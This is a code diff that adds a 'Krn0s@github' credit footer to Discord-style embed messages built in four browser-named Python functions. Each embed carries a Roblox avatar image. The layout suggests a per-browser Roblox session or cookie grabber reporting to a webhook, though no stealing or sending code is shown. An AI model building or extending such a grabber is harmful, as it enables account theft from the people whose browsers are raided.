@@ -18,7 +18,11 @@ def MicrosoftEdge():
             "color": 16711680,
                 "image":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                }
+                },
+                "footer": {
+        "text": "Krn0s@github",
+        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
+      }
         }]})
     except:
         pass
@@ -37,7 +41,11 @@ def GoogleChrome():
                 "color": 16711680,
                 "image":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                }
+                },
+                "footer": {
+        "text": "Krn0s@github",
+        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
+      }
                 
                 }]})
 
@@ -58,7 +66,11 @@ def MozillaFirefox():
                 "color": 16711680,
                 "image":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                }
+                },
+                "footer": {
+        "text": "Krn0s@github",
+        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
+      }
 
                 }]})
     except:
@@ -78,7 +90,11 @@ def Opera():
                 "color": 16711680,
                 "image":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
-                }
+                },
+                "footer": {
+        "text": "Krn0s@github",
+        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
+      }
 
                 }]})
     except:
